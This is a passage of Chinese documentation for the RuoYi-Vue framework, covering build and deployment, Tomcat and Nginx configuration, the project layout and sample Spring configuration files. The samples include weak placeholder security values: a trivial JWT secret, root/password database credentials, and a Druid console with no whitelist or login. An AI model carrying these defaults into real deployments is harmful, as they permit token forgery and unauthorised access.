	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
		
<span class="token comment">&lt;!-- 单应用排除内置tomcat --&gt;</span>		
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3><a id="2_828"></a>.2、前端部署</h3>
<p>当项目开发完毕，只需要运行一行命令就可以打包你的应用</p>
<pre><code class="prism language-bash"><span class="token comment"># 打包正式环境</span>
<span class="token function">npm</span> run build:prod

<span class="token comment"># 打包预发布环境</span>
<span class="token function">npm</span> run build:stage
</code></pre>
<p>构建打包成功之后，会在根目录生成 <code>dist</code> 文件夹，里面就是构建打包好的文件，通常是 <code>***.js</code> 、<code>***.css</code>、<code>index.html</code> 等静态文件。</p>
<p>通常情况下 <code>dist</code> 文件夹的静态文件发布到你的 nginx 或者静态服务器即可，其中的 <code>index.html</code> 是后台服务的入口页面。</p>
<p>outputDir 提示</p>
<p>如果需要自定义构建，比如指定 <code>dist</code> 目录等，则需要通过 <a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/vue.config.js">config (opens new window)</a>的 <code>outputDir</code> 进行配置。</p>
<p>publicPath 提示</p>
<p>部署时改变页面js 和 css 静态引入路径 ,只需修改 <code>vue.config.js</code> 文件资源路径即可。</p>
<pre><code class="prism language-js">publicPath<span class="token operator">:</span> <span class="token string">'./'</span> <span class="token comment">//请根据自己路径来配置更改</span>
</code></pre>
<pre><code class="prism language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
  mode<span class="token operator">:</span> <span class="token string">'hash'</span><span class="token punctuation">,</span> <span class="token comment">// hash模式</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<h2><a id="_864"></a>四、环境变量</h2>
<p>所有测试环境或者正式环境变量的配置都在 <a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/.env.development">.env.development (opens new window)</a>等 <code>.env.xxxx</code>文件中。</p>
<p>它们都会通过 <code>webpack.DefinePlugin</code> 插件注入到全局。</p>
<p>环境变量必须以<code>VUE_APP_</code>为开头。如:<code>VUE_APP_API</code>、<code>VUE_APP_TITLE</code></p>
<p>你在代码中可以通过如下方式获取:</p>
<pre><code class="prism language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>VUE_APP_xxxx<span class="token punctuation">)</span>
</code></pre>
<p>扩展阅读：<a href="https://cli.vuejs.org/zh/guide/mode-and-env.html">《Vue CLI - 环境变量和模式》</a></p>
<ul><li class="task-list-item"><input checked="true" class="task-list-item-checkbox" disabled="disabled" type="checkbox"/> <strong>注</strong>：环境配置修改后，需要重新运行才会生效</li></ul>
<h3><a id="1Tomcat_882"></a>.1、Tomcat配置</h3>
<p>修改<code>server.xml</code>，<code>Host</code>节点下添加</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Context</span> <span class="token attr-name">docBase</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">reloadable</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">source</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
</code></pre>
<p><code>dist</code>目录的文件夹下新建<code>WEB-INF</code>文件夹，并在里面添加<code>web.xml</code>文件</p>
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span> 
        <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee
        http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd<span class="token punctuation">"</span></span>
        <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3.1<span class="token punctuation">"</span></span> <span class="token attr-name">metadata-complete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">&gt;</span></span>Router for Tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>error-page</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>error-code</span><span class="token punctuation">&gt;</span></span>404<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>error-code</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">&gt;</span></span>/index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>error-page</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<h3><a id="2Nginx_907"></a>.2、Nginx配置</h3>
<pre><code class="prism language-text">worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
		charset utf-8;

		location / {
            root   /home/ruoyi/projects/ruoyi-ui;
			try_files $uri $uri/ /index.html;
            index  index.html index.htm;
        }
		
		location /prod-api/ {
			proxy_set_header Host $http_host;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header REMOTE-HOST $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_pass http://localhost:8080/;
		}

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
</code></pre> 建议开启Gzip压缩
<p>在<code>http</code>配置中加入如下代码对全局的资源进行压缩，可以减少文件体积和加快网页访问速度。</p>
<div class="language-conf line-numbers-mode">
<pre class="language-text"><code># 开启gzip压缩
gzip on;
# 不压缩临界值，大于1K的才压缩，一般不用改
gzip_min_length 1k;
# 压缩缓冲区
gzip_buffers 16 64K;
# 压缩版本（默认1.1，前端如果是squid2.5请使用1.0）
gzip_http_version 1.1;
# 压缩级别，1-10，数字越大压缩的越好，时间也越长
gzip_comp_level 5;
# 进行压缩的文件类型
gzip_types text/plain application/x-javascript text/css application/xml application/javascript;
# 跟Squid等缓存服务有关，on的话会在Header里增加"Vary: Accept-Encoding"
gzip_vary on;
# IE6对Gzip不怎么友好，不给它Gzip了
gzip_disable "MSIE [1-6]\.";
</code></pre>
<div class="line-numbers-wrapper">
<span class="line-number">1</span>
<br/>
<span class="line-number">2</span>
<br/>
<span class="line-number">3</span>
<br/>
<span class="line-number">4</span>
<br/>
<span class="line-number">5</span>
<br/>
<span class="line-number">6</span>
<br/>
<span class="line-number">7</span>
<br/>
<span class="line-number">8</span>
<br/>
<span class="line-number">9</span>
<br/>
<span class="line-number">10</span>
<br/>
<span class="line-number">11</span>
<br/>
<span class="line-number">12</span>
<br/>
<span class="line-number">13</span>
<br/>
<span class="line-number">14</span>
<br/>
<span class="line-number">15</span>
<br/>
<span class="line-number">16</span>
<br/>
</div>
</div>
<p>同时建议开启解压缩静态文件 <a class="" href="http://doc.ruoyi.vip/ruoyi-vue/other/faq.html#%E4%BD%BF%E7%94%A8Gzip%E8%A7%A3%E5%8E%8B%E7%BC%A9%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6">如何使用Gzip解压缩静态文件</a></p>
<h3><a id="3_969"></a>.3、常见问题</h3>
<ol><li>如果使用<code>Mac</code>需要修改<code>application.yml</code>文件路径<code>profile</code></li><li>如果使用<code>Linux</code> 提示表不存在，设置大小写敏感配置在<code>/etc/my.cnf</code>添加<code>lower_case_table_names=1</code>，重启MYSQL服务</li><li>如果提示当前权限不足，无法写入文件请检查<code>application.yml</code>中的<code>profile</code>路径或<code>logback.xml</code>中的<code>log.path</code>路径是否有可读可写操作权限</li></ol>
<p>如遇到无法解决的问题请到<a href="https://gitee.com/y_project/RuoYi-Vue/issues">Issues (opens new window)</a>反馈，会不定时进行解答。</p>
<h2><a id="_977"></a>五、项目介绍</h2>
<p>后端结构</p>
<pre><code class="prism language-text">com.ruoyi     
├── common            // 工具类
│       └── annotation                    // 自定义注解
│       └── config                        // 全局配置
│       └── constant                      // 通用常量
│       └── core                          // 核心控制
│       └── enums                         // 通用枚举
│       └── exception                     // 通用异常
│       └── filter                        // 过滤器处理
│       └── utils                         // 通用类处理
├── framework         // 框架核心
│       └── aspectj                       // 注解实现
│       └── config                        // 系统配置
│       └── datasource                    // 数据权限
│       └── interceptor                   // 拦截器
│       └── manager                       // 异步处理
│       └── security                      // 权限控制
│       └── web                           // 前端控制
├── ruoyi-generator   // 代码生成（可移除）
├── ruoyi-quartz      // 定时任务（可移除）
├── ruoyi-system      // 系统代码
├── ruoyi-admin       // 后台服务
├── ruoyi-xxxxxx      // 其他模块
</code></pre>
<p>前端结构</p>
<pre><code class="prism language-text">├── build                      // 构建相关  
├── bin                        // 执行脚本
├── public                     // 公共文件
│   ├── favicon.ico            // favicon图标
│   └── index.html             // html模板
│   └── robots.txt             // 反爬虫
├── src                        // 源代码
│   ├── api                    // 所有请求
│   ├── assets                 // 主题 字体等静态资源
│   ├── components             // 全局公用组件
│   ├── directive              // 全局指令
│   ├── layout                 // 布局
│   ├── router                 // 路由
│   ├── store                  // 全局 store管理
│   ├── utils                  // 全局公用方法
│   ├── views                  // view
│   ├── App.vue                // 入口页面
│   ├── main.js                // 入口 加载组件 初始化等
│   ├── permission.js          // 权限管理
│   └── settings.js            // 系统配置
├── .editorconfig              // 编码格式
├── .env.development           // 开发环境配置
├── .env.production            // 生产环境配置
├── .env.staging               // 测试环境配置
├── .eslintignore              // 忽略语法检查
├── .eslintrc.js               // eslint 配置项
├── .gitignore                 // git 忽略项
├── babel.config.js            // babel.config.js
├── package.json               // package.json
└── vue.config.js              // vue.config.js
</code></pre>
<p>配置文件</p>
<p>通用配置 <code>application.yml</code></p>
<pre><code class="prism language-yml"><span class="token comment"># 项目相关配置</span>
<span class="token key atrule">ruoyi</span><span class="token punctuation">:</span>
  <span class="token comment"># 名称</span>
  <span class="token key atrule">name</span><span class="token punctuation">:</span> RuoYi
  <span class="token comment"># 版本</span>
  <span class="token key atrule">version</span><span class="token punctuation">:</span> 3.3.0
  <span class="token comment"># 版权年份</span>
  <span class="token key atrule">copyrightYear</span><span class="token punctuation">:</span> <span class="token number">2021</span>
  <span class="token comment"># 实例演示开关</span>
  <span class="token key atrule">demoEnabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）</span>
  <span class="token key atrule">profile</span><span class="token punctuation">:</span> D<span class="token punctuation">:</span>/ruoyi/uploadPath
  <span class="token comment"># 获取ip地址开关</span>
  <span class="token key atrule">addressEnabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token comment"># 验证码类型 math 数组计算 char 字符验证</span>
  <span class="token key atrule">captchaType</span><span class="token punctuation">:</span> math

<span class="token comment"># 开发环境配置</span>
<span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token comment"># 服务器的HTTP端口，默认为8080</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8080</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
    <span class="token comment"># 应用的访问路径</span>
    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /
  <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>
    <span class="token comment"># tomcat的URI编码</span>
    <span class="token key atrule">uri-encoding</span><span class="token punctuation">:</span> UTF<span class="token punctuation">-</span><span class="token number">8</span>
    <span class="token comment"># tomcat最大线程数，默认为200</span>
    <span class="token key atrule">max-threads</span><span class="token punctuation">:</span> <span class="token number">800</span>
    <span class="token comment"># Tomcat启动初始化的线程数，默认值25</span>
    <span class="token key atrule">min-spare-threads</span><span class="token punctuation">:</span> <span class="token number">30</span>

<span class="token comment"># 日志配置</span>
<span class="token key atrule">logging</span><span class="token punctuation">:</span>
  <span class="token key atrule">level</span><span class="token punctuation">:</span>
    <span class="token key atrule">com.ruoyi</span><span class="token punctuation">:</span> debug
    <span class="token key atrule">org.springframework</span><span class="token punctuation">:</span> warn

<span class="token comment"># Spring配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token comment"># 资源信息</span>
  <span class="token key atrule">messages</span><span class="token punctuation">:</span>
    <span class="token comment"># 国际化资源文件路径</span>
    <span class="token key atrule">basename</span><span class="token punctuation">:</span> i18n/messages
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span> 
    <span class="token key atrule">active</span><span class="token punctuation">:</span> druid
  <span class="token comment"># 文件上传</span>
  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>
     <span class="token key atrule">multipart</span><span class="token punctuation">:</span>
       <span class="token comment"># 单个文件大小</span>
       <span class="token key atrule">max-file-size</span><span class="token punctuation">:</span>  10MB
       <span class="token comment"># 设置总上传的文件大小</span>
       <span class="token key atrule">max-request-size</span><span class="token punctuation">:</span>  20MB
  <span class="token comment"># 服务模块</span>
  <span class="token key atrule">devtools</span><span class="token punctuation">:</span>
    <span class="token key atrule">restart</span><span class="token punctuation">:</span>
      <span class="token comment"># 热部署开关</span>
      <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># redis 配置</span>
  <span class="token key atrule">redis</span><span class="token punctuation">:</span>
    <span class="token comment"># 地址</span>
    <span class="token key atrule">host</span><span class="token punctuation">:</span> localhost
    <span class="token comment"># 端口，默认为6379</span>
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6379</span>
    <span class="token comment"># 数据库索引</span>
    <span class="token key atrule">database</span><span class="token punctuation">:</span> <span class="token number">0</span>
    <span class="token comment"># 密码</span>
    <span class="token key atrule">password</span><span class="token punctuation">:</span> 
    <span class="token comment"># 连接超时时间</span>
    <span class="token key atrule">timeout</span><span class="token punctuation">:</span> 10s
    <span class="token key atrule">lettuce</span><span class="token punctuation">:</span>
      <span class="token key atrule">pool</span><span class="token punctuation">:</span>
        <span class="token comment"># 连接池中的最小空闲连接</span>
        <span class="token key atrule">min-idle</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token comment"># 连接池中的最大空闲连接</span>
        <span class="token key atrule">max-idle</span><span class="token punctuation">:</span> <span class="token number">8</span>
        <span class="token comment"># 连接池的最大数据库连接数</span>
        <span class="token key atrule">max-active</span><span class="token punctuation">:</span> <span class="token number">8</span>
        <span class="token comment"># #连接池最大阻塞等待时间（使用负值表示没有限制）</span>
        <span class="token key atrule">max-wait</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>1ms

<span class="token comment"># token配置</span>
<span class="token key atrule">token</span><span class="token punctuation">:</span>
    <span class="token comment"># 令牌自定义标识</span>
    <span class="token key atrule">header</span><span class="token punctuation">:</span> Authorization
    <span class="token comment"># 令牌密钥</span>
    <span class="token key atrule">secret</span><span class="token punctuation">:</span> abcdefghijklmnopqrstuvwxyz
    <span class="token comment"># 令牌有效期（默认30分钟）</span>
    <span class="token key atrule">expireTime</span><span class="token punctuation">:</span> <span class="token number">30</span>
  
<span class="token comment"># MyBatis配置</span>
<span class="token key atrule">mybatis</span><span class="token punctuation">:</span>
    <span class="token comment"># 搜索指定包别名</span>
    <span class="token key atrule">typeAliasesPackage</span><span class="token punctuation">:</span> com.ruoyi.<span class="token important">**.domain</span>
    <span class="token comment"># 配置mapper的扫描，找到所有的mapper.xml映射文件</span>
    <span class="token key atrule">mapperLocations</span><span class="token punctuation">:</span> classpath<span class="token important">*:mapper/**/*Mapper.xml</span>
    <span class="token comment"># 加载全局的配置文件</span>
    <span class="token key atrule">configLocation</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mybatis/mybatis<span class="token punctuation">-</span>config.xml

<span class="token comment"># PageHelper分页插件</span>
<span class="token key atrule">pagehelper</span><span class="token punctuation">:</span> 
  <span class="token key atrule">helperDialect</span><span class="token punctuation">:</span> mysql
  <span class="token key atrule">reasonable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">supportMethodsArguments</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">params</span><span class="token punctuation">:</span> count=countSql 

<span class="token comment"># Swagger配置</span>
<span class="token key atrule">swagger</span><span class="token punctuation">:</span>
  <span class="token comment"># 是否开启swagger</span>
  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 请求前缀</span>
  <span class="token key atrule">pathMapping</span><span class="token punctuation">:</span> /dev<span class="token punctuation">-</span>api

<span class="token comment"># 防止XSS攻击</span>
<span class="token key atrule">xss</span><span class="token punctuation">:</span> 
  <span class="token comment"># 过滤开关</span>
  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token comment"># 排除链接（多个用逗号分隔）</span>
  <span class="token key atrule">excludes</span><span class="token punctuation">:</span> /system/notice/*
  <span class="token comment"># 匹配链接</span>
  <span class="token key atrule">urlPatterns</span><span class="token punctuation">:</span> /system/*<span class="token punctuation">,</span>/monitor/*<span class="token punctuation">,</span>/tool/*
</code></pre>
<p>数据源配置 <code>application-druid.yml</code></p>
<pre><code class="prism language-yml"><span class="token comment"># 数据源配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
    <span class="token key atrule">datasource</span><span class="token punctuation">:</span>
        <span class="token key atrule">type</span><span class="token punctuation">:</span> com.alibaba.druid.pool.DruidDataSource
        <span class="token key atrule">driverClassName</span><span class="token punctuation">:</span> com.mysql.cj.jdbc.Driver
        <span class="token key atrule">druid</span><span class="token punctuation">:</span>
            <span class="token comment"># 主库数据源</span>
            <span class="token key atrule">master</span><span class="token punctuation">:</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">-</span>vue<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> password
            <span class="token comment"># 从库数据源</span>
            <span class="token key atrule">slave</span><span class="token punctuation">:</span>
                <span class="token comment"># 从数据源开关/默认关闭</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> 
                <span class="token key atrule">username</span><span class="token punctuation">:</span> 
                <span class="token key atrule">password</span><span class="token punctuation">:</span> 
            <span class="token comment"># 初始连接数</span>
            <span class="token key atrule">initialSize</span><span class="token punctuation">:</span> <span class="token number">5</span>
            <span class="token comment"># 最小连接池数量</span>
            <span class="token key atrule">minIdle</span><span class="token punctuation">:</span> <span class="token number">10</span>
            <span class="token comment"># 最大连接池数量</span>
            <span class="token key atrule">maxActive</span><span class="token punctuation">:</span> <span class="token number">20</span>
            <span class="token comment"># 配置获取连接等待超时的时间</span>
            <span class="token key atrule">maxWait</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒</span>
            <span class="token key atrule">timeBetweenEvictionRunsMillis</span><span class="token punctuation">:</span> <span class="token number">60000</span>
            <span class="token comment"># 配置一个连接在池中最小生存的时间，单位是毫秒</span>
            <span class="token key atrule">minEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">300000</span>
            <span class="token comment"># 配置一个连接在池中最大生存的时间，单位是毫秒</span>
            <span class="token key atrule">maxEvictableIdleTimeMillis</span><span class="token punctuation">:</span> <span class="token number">900000</span>
            <span class="token comment"># 配置检测连接是否有效</span>
            <span class="token key atrule">validationQuery</span><span class="token punctuation">:</span> SELECT 1 FROM DUAL
            <span class="token key atrule">testWhileIdle</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">testOnBorrow</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">testOnReturn</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
            <span class="token key atrule">webStatFilter</span><span class="token punctuation">:</span> 
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
            <span class="token key atrule">statViewServlet</span><span class="token punctuation">:</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token comment"># 设置白名单，不填则允许所有访问</span>
                <span class="token key atrule">allow</span><span class="token punctuation">:</span>
                <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> /druid/*
                <span class="token comment"># 控制台管理用户名和密码</span>
                <span class="token key atrule">login-username</span><span class="token punctuation">:</span> 
                <span class="token key atrule">login-password</span><span class="token punctuation">:</span> 
            <span class="token key atrule">filter</span><span class="token punctuation">:</span>
                <span class="token key atrule">stat</span><span class="token punctuation">:</span>
                    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token comment"># 慢SQL记录</span>
                    <span class="token key atrule">log-slow-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                    <span class="token key atrule">slow-sql-millis</span><span class="token punctuation">:</span> <span class="token number">1000</span>
                    <span class="token key atrule">merge-sql</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">wall</span><span class="token punctuation">:</span>
                    <span class="token key atrule">config</span><span class="token punctuation">:</span>
                        <span class="token key atrule">multi-statement-allow</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
</code></pre>
<p>代码生成配置 <code>generator.yml</code></p>
<pre><code class="prism language-yml"><span class="token comment"># 代码生成</span>
<span class="token key atrule">gen</span><span class="token punctuation">:</span> 
  <span class="token comment"># 作者</span>
  <span class="token key atrule">author</span><span class="token punctuation">:</span> ruoyi
  <span class="token comment"># 默认生成包路径 system 需改成自己的模块名称 如 system monitor tool</span>
  <span class="token key atrule">packageName</span><span class="token punctuation">:</span> com.ruoyi.system
  <span class="token comment"># 自动去除表前缀，默认是false</span>
  <span class="token key atrule">autoRemovePre</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token comment"># 表前缀（生成类名不会包含表前缀，多个用逗号分隔）</span>
  <span class="token key atrule">tablePrefix</span><span class="token punctuation">:</span> sys_
</code></pre>
<p>核心技术</p>
<p>TIP</p>
<ul><li>前端技术栈 ES6、vue、vuex、vue-router、vue-cli、axios、element-ui</li><li>后端技术栈 SpringBoot、MyBatis、Spring Security、Jwt</li></ul>
<p>后端技术</p>
<p>SpringBoot框架</p>
<p>1、介绍<br/> <code>Spring Boot</code>是一款开箱即用框架，提供各种默认配置来简化项目配置。让我们的<code>Spring</code>应用变的更轻量化、更快的入门。 在主程序执行<code>main</code>函数就可以运行。你也可以打包你的应用为<code>jar</code>并通过使用<code>java -jar</code>来运行你的Web应用。它遵循"约定优先于配置"的原则， 使用<code>SpringBoot</code>只需很少的配置，大部分的时候直接使用默认的配置即可。同时可以与<code>Spring Cloud</code>的微服务无缝结合。</p>
<p>提示</p>
<p><code>Spring Boot2.x</code>版本环境要求必须是<code>jdk8</code>或以上版本，服务器<code>Tomcat8</code>或以上版本</p>
<p>2、优点</p>
<ul><li>使编码变得简单： 推荐使用注解。</li><li>使配置变得简单： 自动配置、快速集成新技术能力 没有冗余代码生成和XML配置的要求</li><li>使部署变得简单： 内嵌Tomcat、Jetty、Undertow等web容器，无需以war包形式部署</li><li>使监控变得简单： 提供运行时的应用监控</li><li>使集成变得简单： 对主流开发框架的无配置集成。</li><li>使开发变得简单： 极大地提高了开发快速构建项目、部署效率。</li></ul>
<p>Spring Security安全控制</p>
<p>1、介绍<br/> <code>Spring Security</code>是一个能够为基于<code>Spring</code>的企业应用系统提供声明式的安全访问控制解决方案的安全框架。</p>
<p>2、功能<br/> <code>Authentication</code> 认证，就是用户登录<br/> <code>Authorization</code> 授权，判断用户拥有什么权限，可以访问什么资源<br/> 安全防护，跨站脚本攻击，<code>session</code>攻击等<br/> 非常容易结合<code>Spring</code>进行使用</p>
<p>3、<code>Spring Security</code>与<code>Shiro</code>的区别</p>
<blockquote>
<p>相同点</p>
</blockquote>
<p>1、认证功能<br/> 2、授权功能<br/> 3、加密功能<br/> 4、会话管理<br/> 5、缓存支持<br/> 6、rememberMe功能<br/> …</p>
<blockquote>
<p>不同点</p>
</blockquote>
<p>优点：</p>
<p>1、Spring Security基于Spring开发，项目如果使用Spring作为基础，配合Spring Security做权限更加方便。而Shiro需要和Spring进行整合开发<br/> 2、Spring Security功能比Shiro更加丰富，例如安全防护方面<br/> 3、Spring Security社区资源相对比Shiro更加丰富</p>
<p>缺点：</p>
<p>1）Shiro的配置和使用比较简单，Spring Security上手复杂些<br/> 2）Shiro依赖性低，不需要依赖任何框架和容器，可以独立运行。Spring Security依赖Spring容器</p>
<p>前端技术</p>
<ul><li>npm：node.js的包管理工具，用于统一管理我们前端项目中需要用到的包、插件、工具、命令等，便于开发和维护。</li><li>ES6：Javascript的新版本，ECMAScript6的简称。利用ES6我们可以简化我们的JS代码，同时利用其提供的强大功能来快速实现JS逻辑。</li><li>vue-cli：Vue的脚手架工具，用于自动生成Vue项目的目录及文件。</li><li>vue-router： Vue提供的前端路由工具，利用其我们实现页面的路由控制，局部刷新及按需加载，构建单页应用，实现前后端分离。</li><li>vuex：Vue提供的状态管理工具，用于统一管理我们项目中各种数据的交互和重用，存储我们需要用到数据对象。</li><li>element-ui：基于MVVM框架Vue开源出来的一套前端ui组件。</li></ul>
<h2><a id="_1323"></a>六、后台手册</h2>
<h3><a id="1_1325"></a>.1、分页实现</h3>
<ul><li>前端基于<code>element</code>封装的分页组件 <a href="https://gitee.com/y_project/RuoYi-Vue/blob/master/ruoyi-ui/src/components/Pagination">pagination(opens new window)</a></li><li>后端基于<code>mybatis</code>的轻量级分页插件<a href="https://github.com/pagehelper/Mybatis-PageHelper">pageHelper(opens new window)</a></li></ul>
<h3><a id="2_1330"></a>.2、前端调用实现</h3>
